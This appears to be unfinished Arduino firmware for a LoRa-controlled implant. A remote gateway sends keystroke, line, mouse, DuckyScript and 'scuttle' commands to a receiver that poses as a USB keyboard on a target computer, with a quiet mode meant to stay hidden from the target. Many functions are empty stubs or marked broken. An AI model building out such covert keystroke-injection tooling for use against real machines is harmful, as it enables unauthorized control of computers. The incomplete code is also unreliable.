#ifdef __AVR__
  #include <avr/pgmspace.h>
#elif defined(ESP8266)
 #include <pgmspace.h>
#else
 #define pgm_read_byte(addr) (*(const unsigned char *)(addr))
#endif

#if !defined(__ARM_ARCH) && !defined(ENERGIA) && !defined(ESP8266)
 #include <util/delay.h>
#endif

#include <stdlib.h>
#include <stdint.h>
#include <SPI.h>
#include <RTCZero.h>
#include <limits.h>
#include <Keyboard.h>
#include <Mouse.h>
#include <RH_RF95.h>
#include <elapsedMillis.h>


#include "Arduino.h"
#include "LEK_Protocol.h"
#include "LEK_Protocol_Definitions.h"

/*
    Some code from Samy Kamkar's USB DriveBy is included in the receiver because it's
    pretty sweet. You can check out the USB DriveBy project https://github.com/samyk/usbdriveby
    for more information.
*/


//TODO: I currently extremely dislike this section of the code...
LEK_Protocol::LEK_Protocol(DeviceMode user_mode, uint8_t user_network_address, uint64_t user_uuid, const char* user_node_name, bool user_beaconing)
  {
  SPI.begin();
  Serial.begin(LEK_DEFAULT_SERIAL_BAUD_RATE);
  Serial.setTimeout(LEK_DEFAULT_SERIAL_TIMEOUT);
  this->_rf_module = new RH_RF95(LEK_RFM_CS_PIN, LEK_RFM_INT_PIN);

  pinMode(LEK_LINK_LED_PIN, OUTPUT);
  pinMode(LEK_HB_LED_PIN, OUTPUT);
  pinMode(LEK_USB_DEVICE_MUX_PIN, OUTPUT);
  pinMode(LEK_USB_DEVICE_PWR_PIN, OUTPUT);

  pinMode(LEK_RFM_RESET_PIN, INPUT_PULLUP);

  this->rfmReset();
  delay(100);
  this->rfmSetup();

  Serial.println("I did it!!!!");
  

  _global_sequence = 0;
  _network_address = user_network_address;
  /* TODO: strncpy to the _uuid array */
  //_uuid = user_uuid;
  /* copy user name to node name - strncpy limited to size of buffer */
  _node_name[LEK_MAX_NODE_NAME] = { 0 };
  _beaconing = user_beaconing;
  _tick_rate = LEK_DEFAULT_TICK_RATE;
  _uptime_ticks = 0;
  /* Memset these statically allocated buffers, you say? */
  memset(_event_callbacks, 0, sizeof(_event_callbacks));
  memset(_temp_script, 0, sizeof(_temp_script));

  if (user_mode == kGATEWAY_SLAVE){
    /* Gateway Master mode replays any received packets to the 
    receiver program on the PC. It drains the FIFO as it's filled, and will
    send out any packets it receivers over the wire.
    */
    //Zero all events
    //Load Node Name from EEPROM
    //Load UUID from EEPROM
    //Load Network Address from EEPROM
    //Load Beaconing Setting from EEPROM

  } else if (user_mode == kGATEWAY_CONSOLE){
    /* Gateway Console mode is self contained...
    All interaction is interactive with the user.
    Incoming packets are displayed in human readable format if possible.
    */
    //Load all events
    //Load Node Name from EEPROM
    //Load UUID from EEPROM
    //Load Network Address from EEPROM
    //Load Beaconing Setting from EEPROM

  } else if (user_mode == kRECEIVER_DEPLOYED){
    /* Receiver Deployed has received it's setup data from the PC, and is now ready to begin
    operations. There are sub-modes to this mode, which involve base behaviors of the unit.
    i.e. Quiet mode (do not EVER announce self to target, do not beacon), Beaconing mode (routinely send out
    presence beacons), Normal mode (do not beacon, other functions work as expected)
    */

  } else if (user_mode == kRECEIVER_UNPAIRED){
    /* Receiver Unpaired is awaiting setup data from a console program on the PC. */

  } else {
    /* No (or incorrect) mode  selected, cannot continue. Fall back into console mode. */
    signalFastBlink();
  }

  /* If the unit is in console mode, it will spin and wait for the user's Serial connection
  to attach... */
  if (user_mode == kGATEWAY_CONSOLE){
    while (!Serial){;}
  }
  displayConsoleStartupMessage();

}

LEK_Protocol::~LEK_Protocol(){
  delete _rf_module;
}

void LEK_Protocol::begin() {
  /* Setup event registration buffers, permanent/temporary storage locations, 
  recover setup information from the EEPROM, execute poweron events, setup event buffers,
  setup incoming packet buffers, setup mode, setup i2c keystore. */


}

void LEK_Protocol::spin(){
  /* Run routine events:
    Check if there is a queued script to run (this interrupts all other execution)
    Check if radio state has changed, if so disable radio
    Check for incoming radio packet
    Copy to incoming radio packet FIFO
    Drain one message from incoming radio packet FIFO
      Authenticate packet from FIFO
      Parse packet pulled from FIFO
      If message requires spin hotwire, then execute respin
      If message matches any acceptance type and sequences on a transaction, mark for destruction
    Do Transactions work
    Garbage collect Transactions
    Do LEDControls work
    Garbage collect LED Controls
    Check timer ticks for event triggers
    Check RTC ticks for event triggers
    Check for incoming serial message
    Parse incoming serial message
      Acknowledge the user's command
      If console mode, update console state
      If gateway master mode, update internal state/execute command
      If unpaired mode, accept setup data
  */
}

void LEK_Protocol::reloadParametersFromEEPROM(){

}

void LEK_Protocol::rfmSetup(){
  while (!_rf_module->init()) {
    Serial.println("LoRa radio init failed");
    signalFaultTrap();
  }
  Serial.println("LoRa radio init OK!");
 
  // Defaults after init are 434.0MHz, modulation GFSK_Rb250Fd250, +13dbM
  if (!_rf_module->setFrequency(LEK_RFM_FREQ)) {
    Serial.println("setFrequency failed");
    while (1);
  }
  Serial.print("Set Freq to: "); Serial.println(LEK_RFM_FREQ);
  
  // Defaults after init are 434.0MHz, 13dBm, Bw = 125 kHz, Cr = 4/5, Sf = 128chips/symbol, CRC on
 
  // The default transmitter power is 13dBm, using PA_BOOST.
  // If you are using RFM95/96/97/98 modules which uses the PA_BOOST transmitter pin, then 
  // you can set transmitter powers from 5 to 23 dBm:
  _rf_module->setTxPower(23, false);
}

void LEK_Protocol::rfmReset(){
  digitalWrite(LEK_RFM_RESET_PIN, LOW);
  delay(100);
  digitalWrite(LEK_RFM_RESET_PIN, HIGH);
  delay(100);
}

void LEK_Protocol::rfmSendPacket(const uint8_t *packet, uint8_t packet_length){
  _rf_module->send(packet, packet_length);
  _rf_module->waitPacketSent();
  //Submit a request to blink link LED
}

void LEK_Protocol::rfmReadPacket(){
  if (_rf_module->available()){
    // Should be a message for us now   
    uint8_t buf[RH_RF95_MAX_MESSAGE_LEN] = { 0 };
    uint8_t len = sizeof(buf);
    
    /* This will block for a short time if the packet is not "complete" */
    if (_rf_module->recv(buf, &len)){
      //Add to packet QueueList
      //Submit a request to blink link LED
    } else {
      _count_of_failed_packet_receives++;
    }
  }

}

/* If it's low, the radio is off. Reset pin is active low... */
bool LEK_Protocol::rfmReadRadioState(){
  return digitalRead(LEK_RFM_RESET_PIN);
}

void LEK_Protocol::rfmSetRadioState(bool radio_state){
  digitalWrite(LEK_RFM_RESET_PIN, radio_state);
}

bool LEK_Protocol::rfmReadChannelState(){
  return _rf_module->isChannelActive();
}
  
bool LEK_Protocol::rfmWaitForChannelClear(){
  return _rf_module->waitCAD();
}

/* If we've got a line that the user is typing, we should display it here... */
void LEK_Protocol::displayConsole(){
  this->clearTerminal();
  //Display system information here?
  Serial.print(">");
  //Display buffered serial command line depending on the state... _console_buffer
  switch (_console_state) 
  {
    case kCONSOLE_STATE_MAIN_MENU:
      if (_last_console_state != kCONSOLE_STATE_MAIN_MENU){
        _last_console_state = kCONSOLE_STATE_MAIN_MENU;
      }
      break;
    case kCONSOLE_STATE_SCANNING:
      if (_last_console_state != kCONSOLE_STATE_SCANNING){
        _last_console_state = kCONSOLE_STATE_SCANNING;
      } 
      break;
    case kCONSOLE_STATE_PAIRING:
      if (_last_console_state != kCONSOLE_STATE_PAIRING){
        _last_console_state = kCONSOLE_STATE_PAIRING;
      } 
      break;
    case kCONSOLE_STATE_RECEIVING:
      if (_last_console_state != kCONSOLE_STATE_RECEIVING){
        _last_console_state = kCONSOLE_STATE_RECEIVING;
      } 
      break;
    default:
      //Unknown console state? We should drop back into the main menu...
      break;
  }

}

void LEK_Protocol::updateConsoleState(GatewayConsoleState state){
  /* Save the last console state so we can perform certain actions on state transitions... */
  _last_console_state = _console_state;
  _console_state = state;
}

/* TODO: Create print functions for the more obscure data structures */
void LEK_Protocol::displayConsoleStartupMessage(){
  Serial.println("LEK STARTUP>");
  /* This displays the values that are loaded into RAM, not EEPROM. If the system has just reset,
  then it will reload the values that were saved to EEPROM (or are hardcoded depending on the constructor
  they used..) */
  //Mode
  Serial.print("Mode: ");
  if (_mode == kGATEWAY_CONSOLE){
    Serial.println("GATEWAY CONSOLE MODE");
  } else if (_mode == kGATEWAY_SLAVE){
    Serial.println("GATEWAY SLAVE MODE");
  } else if (_mode == kRECEIVER_DEPLOYED){
    Serial.println("RECEIVER DEPLOYED MODE");
  } else if (_mode == kRECEIVER_UNPAIRED){
    Serial.println("RECEIVER UNPAIRED MODE");
  } else {
    Serial.println("UNSET");
  }
  //Node Name
  Serial.print("Node Name: ");
  Serial.println(_node_name);

  //Network Address
  Serial.print("Network Address: ");
  Serial.println(_network_address);

  //Tick Rate
  Serial.print("Tick Rate: ");
  Serial.println(_tick_rate);

  //UUID
  Serial.print("UUID: ");
  Serial.println(_uuid);

  //Beaconing
  Serial.print("Beaconing: ");
  Serial.println(_beaconing);

  Serial.println("<LEK STARTUP");
}



void LEK_Protocol::clearTerminal(){
  Serial.write(27);       // ESC command
  Serial.print("[2J");    // clear screen command
  Serial.write(27);
  Serial.print("[H");     // cursor to home command
}

void LEK_Protocol::duckyParse(const char* command_string){
  /* We're parsing the DuckyScript commands in the script */
}

/* This executes a single line in the script, NOT the whole script. */
uint8_t LEK_Protocol::executeScriptIndex(ScriptStorageLocation stored, uint8_t storage_index, uint8_t script_index){

}

/* This will parse and execute a script stored in the location specified. 
Script execution stops when there's an error OR when it reaches a NULL/terminator. */
uint8_t LEK_Protocol::executeScript(ScriptStorageLocation stored, uint8_t storage_index, uint8_t from_index){

}

/* Scripts can be stored in permanent storage, for repeated reference, or in RAM, for use until power cycle. 
[perm - temp] -> [storage index] -> [0-255 script index]
        +------> [storage index] -> [0-255 script index] */
uint8_t LEK_Protocol::storeScript(ScriptStorageLocation store_in, uint8_t storage_index, uint8_t script_index, const char *line){

}

uint8_t LEK_Protocol::commitScriptToEeprom(const char *script, uint8_t storage_index){

}

uint8_t LEK_Protocol::retriveScriptFromEeprom(){

}

uint8_t LEK_Protocol::deleteScript(ScriptStorageLocation store_in, uint8_t storage_index){
  /* If this is a script in memory, memset it. If it's in eeprom, write 0s to it's storage location block. */
}

/* Event Callbacks */
uint8_t LEK_Protocol::registerEvent(uint8_t (*callback_function)(void), uint8_t event_slot){
  /* There are four event slots that can have event callbacks registered to them. The callbacks are script/line executions, or
  hardcoded actions. Some of the events have metadata that also has to be registered in order to work, which is not a part of the
  callback system. Events are also allocated an output buffer, which they can use to generate output frames. */

  /* array of function pointers, which is as large as all of the possible events. Each event owns an index in this table.
  when they are invoked during normal machine function, they check to see if the slot they occupy has a function pointer in it.
  if so, they call that callback function with a pointer to their function metadata (if metadata is desired). */
  if (event_slot > LEK_NUMBER_OF_EVENT_CALLBACKS){
      //Sorry, what's this?
      return -1;
  }
}

/* The unit has received a beacon (from any gateway), and triggers this event callback */
uint8_t LEK_Protocol::gatewayBeaconEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has received a beacon (from a gateway with a specific ID), and triggers this event callback */
uint8_t LEK_Protocol::gatewayBeaconWithIdEvent(){
    /* Array of beacon IDs */
    /* Does this match the ID we're searching for? */
    /* Check if a callback function is registered to this event */
}

/* The unit has powered off, and calls this function when it's powered up to see if a resume
function is set */
uint8_t LEK_Protocol::powerUpEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has received a beacon (from any receiver), and triggers this event callback */
uint8_t LEK_Protocol::receiverBeaconEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has received a beacon (from a receiver with a specific ID), and triggers this event callback */
uint8_t LEK_Protocol::receiverBeaconWithIdEvent(){
    /* Array of beacon IDs */
    /* Does this match the ID we're searching for? */
    /* Check if a callback function is registered to this event */
}

/* The unit has received a malformed message that did not decrypt properly */
uint8_t LEK_Protocol::messageAuthenticationFailureEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has reached a certain count of uptime ticks */
uint8_t LEK_Protocol::uptimeTicksEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has reached or passed a certain specified time */
uint8_t LEK_Protocol::rtcTicksEvent(){
    /* Check if a callback function is registered to this event */
}

/* The unit has received a specific (or any) string over it's serial interface */
uint8_t LEK_Protocol::serialInterfaceReceiveEvent(){
    /* Check if a callback function is registered to this event */
}


/* 
*
*
*
* Protocol Functions
*
*
*
*/


uint8_t *LEK_Protocol::createBeacon(DeviceMode mode, const char* node_name, uint8_t network_address, uint32_t uptime_ticks, uint8_t software_version) {
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, LEK_RESERVED_BROADCAST_ADDRESS);
  if (_mode == kGATEWAY_SLAVE || _mode == kGATEWAY_CONSOLE){
      putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_BEACON);  
  } else if (_mode == kRECEIVER_DEPLOYED){
      putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_BEACON);    
  } else if (_mode == kRECEIVER_UNPAIRED){
      //We shouldn't be beaconing if we're unpaired...
      free(packet);
      return NULL;
  }
  /* Beacons always have message sequence one. */
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, 0x01); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  uint8_t index_offset = putNodeName(packet, LEK_MESSAGE_PAYLOAD_START, node_name);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset, network_address);
  putUnsigned32(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+1, uptime_ticks);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+5, software_version);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+6, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createAcknowledgement(uint8_t message_address, uint8_t message_sequence){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_ACK);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, LEK_RESERVED_BYTE);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createAcknowledgement(uint8_t message_address, uint8_t message_sequence, uint8_t error_code){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_NACK);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, error_code);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}
uint8_t *LEK_Protocol::createKeyPress(uint8_t message_address, uint8_t message_sequence, int key){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_KEY_PRESS);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, key);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createModifierPress(uint8_t message_address, uint8_t message_sequence, int modifier_key, int key){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_MODIFIER_PRESS);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, modifier_key);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, key);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+2, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

/* Broken */
uint8_t *LEK_Protocol::createLinePress(uint8_t message_address, uint8_t message_sequence, const char* line_to_press, size_t line_length, bool terminate_crlf){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_MODIFIER_PRESS);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, terminate_crlf); /* Implicit cast bool to uint8_t */
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, line_length);
  uint8_t index_offset = putString(packet, LEK_MESSAGE_PAYLOAD_START+2, line_to_press);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+2, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createMouseMove(uint8_t message_address, uint8_t message_sequence, int x, int y, int speed, int delay){

}

uint8_t *LEK_Protocol::createSetTime(uint8_t message_address, uint8_t message_sequence, uint32_t current_time){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_SET_TIME);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned32(packet, LEK_MESSAGE_PAYLOAD_START, current_time); 
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+4, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createPackLine(uint8_t message_address, uint8_t message_sequence, const char* line_byte_code, size_t line_length){

}

/* This is for script chunking, not actually packing an enitre script... */
uint8_t *LEK_Protocol::createPackScript(uint8_t message_address, uint8_t message_sequence, uint8_t chunk_sequence, const uint8_t *chunk_byte_code){

}

uint8_t *LEK_Protocol::createPackScriptConclude(uint8_t message_address, uint8_t message_sequence, uint8_t initial_sequence){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_PACK_SCRIPT_CONCLUDE);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, initial_sequence); 
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createScheduleScript(uint8_t message_address, uint8_t message_sequence, uint64_t epoch_time_to_execute, uint8_t script_number, uint8_t starting_index){

}

uint8_t *LEK_Protocol::createStatusRequest(uint8_t message_address, uint8_t message_sequence){

}

uint8_t *LEK_Protocol::createStatusResponse(uint8_t request_address, uint8_t request_sequence, const char* node_name, bool beaconing, uint8_t network_address, uint32_t uptime_ticks) {
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, request_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_STATUS_RESPONSE);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, request_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  uint8_t index_offset = putNodeName(packet, LEK_MESSAGE_PAYLOAD_START, _node_name);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset, network_address);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+1, beaconing);
  putUnsigned32(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+2, uptime_ticks);
  putUnsigned32(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+6, generateCurrentTime());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+10, LEK_RESERVED_MESSAGE_TERMINATOR);
  
  return packet;
}

uint8_t *LEK_Protocol::createSetEventTrigger(uint8_t message_address, uint8_t message_sequence, uint8_t event_slot_index, uint8_t event_id, uint8_t callback_id){

}

uint8_t *LEK_Protocol::createClearLoads(uint8_t message_address, uint8_t message_sequence){

}

uint8_t *LEK_Protocol::createReset(uint8_t message_address, uint8_t message_sequence){

}

uint8_t *LEK_Protocol::createScuttle(uint8_t message_address, uint8_t message_sequence){

}

/* Broken */
uint8_t *LEK_Protocol::createScheduleRequest(uint8_t message_address, uint8_t message_sequence){

}

/* Broken */
uint8_t *LEK_Protocol::createScheduleResponse(uint8_t request_address, uint8_t request_sequence){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, request_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_SCHEDULE_RESPONSE);
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, request_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  if (_scripts_loaded > 0){
    for (int i = 0; i < _scripts_loaded-1; i++){
      putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+(i*5), LEK_RESERVED_MESSAGE_TERMINATOR);    
      putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+(i*5+1), LEK_RESERVED_MESSAGE_TERMINATOR);
    }
    putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+_scripts_loaded*5, LEK_RESERVED_MESSAGE_TERMINATOR);
  } else {
    putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, 0x00);    
    putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  }
  return packet;
}

uint8_t *LEK_Protocol::createExecuteBakedRoutine(uint8_t message_address, uint16_t message_sequence, uint8_t routine_index){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_EXECUTE_BAKED_ROUTINE);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, routine_index);
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

/* Broken */
/* The receiver responds with it's event poll configuration when it is requested */
// Encrypted - Format: [1b] Event Poll Slot 1 [1b] Event Poll Slot 2 [1b] Event Poll Slot 3 [1b] Event Poll Slot 4
uint8_t *LEK_Protocol::createEventPollConfigurationResponse(uint8_t message_address, uint8_t message_sequence){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_GATEWAY_EVENT_POLL_CONFIGURATION_RESPONSE);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  for (int i = 0; i < LEK_NUMBER_OF_REGISTERABLE_EVENTS; i++){
    putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+i, _registered_events[i]);  
  }
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+LEK_NUMBER_OF_REGISTERABLE_EVENTS, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createNop(uint8_t message_address, uint8_t message_sequence){

}

uint8_t *LEK_Protocol::createUsbMuxCtl(uint8_t message_address, uint8_t message_sequence, UsbMuxState new_mux_state){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_USB_MUX_CTL);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, static_cast<uint8_t>(new_mux_state));
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

uint8_t *LEK_Protocol::createUsbSlavePowerCtl(uint8_t message_address, uint8_t message_sequence, UsbPowerState new_power_state){
  uint8_t *packet = (uint8_t *)calloc(LEK_MAX_PAYLOAD_SIZE, sizeof(uint8_t));
  putUnsigned8(packet, LEK_MESSAGE_ADDRESS_INDEX, message_address);  
  putUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX, LEK_RECEIVER_USB_SLAVE_POWER_CTL);    
  putUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX, message_sequence); 
  putUnsigned32(packet, LEK_MESSAGE_SALT_INDEX, generateMessageSalt());
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START, static_cast<uint8_t>(new_power_state));
  putUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);
  return packet;
}

int LEK_Protocol::determinePacketLength(ImmutablePacket packet, size_t absolute_packet_size){
  /* Searches from the tail of the packet... */
  for (int i = absolute_packet_size; i > 0; i--){
    if (packet[i] == LEK_RESERVED_MESSAGE_TERMINATOR){
      return i;
    }
  }
  return -1;  
}

bool LEK_Protocol::validatePacket(ImmutablePacket packet, size_t absolute_packet_size){
  //Use CRC16 to validate packet contents
  //Check network address to see if it matches ours! If not, does it match the broadcast address?
  //If not, drop it
}

void LEK_Protocol::printPacketASCII(ImmutablePacket packet, size_t absolute_packet_size){
  Serial.println("PACKET>");
  for (int i = absolute_packet_size; i < absolute_packet_size; i++){
    Serial.print(packet[i], HEX);  
  }
  Serial.println("<PACKET");
}

void LEK_Protocol::setSystemTime(byte seconds, byte minutes, byte hours, byte day, byte month, byte year) {
  /* Set's the RTCs time */
}

uint64_t LEK_Protocol::getSystemTime(void) {
  /* Pulls the values from the RTC, and converts them to EPOCH time used in the messages. */
}


uint32_t LEK_Protocol::generateMessageSalt(){
   /* Some fancy logic for a sweet message salt here. */
   return 0xFFFFFFFF;
}

uint32_t LEK_Protocol::generateCurrentTime(){
   /* Some fancy logic to grab the value from the RTC here.  */
   return 0xFFFFFFFF;
}

void collectTransaction(){

}

void openTransaction(){

}

void closeTransaction(){

}

void LEK_Protocol::routePacketToHandler(ImmutablePacket packet, size_t absolute_packet_size){
  /* The packet is validated via CRC16 before reaching this, so it's "safe" to assume good data. */
  switch (packet[0]) 
  {
    case LEK_RECEIVER_BEACON:
      handlerBeaconPacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_BEACON:
      handlerBeaconPacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_STATUS_RESPONSE:
      handlerStatusResponsePacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_ACK:
      handlerAckPacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_NACK:
      handlerAckPacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_PACK_SCRIPT_CONCLUDE:
      handlerPackScriptConcludePacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_SCHEDULE_RESPONSE:
      handlerScheduleResponsePacket(packet, absolute_packet_size);
      break;
    case LEK_GATEWAY_EVENT_POLL_CONFIGURATION_RESPONSE:
      handlerEventPollConfigurationResponsePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_KEY_PRESS:
      handlerKeyPressPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_MODIFIER_PRESS:
      handlerModifierPressPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_LINE_PRESS:
      handlerLinePressPacket(packet, absolute_packet_size);
      break;
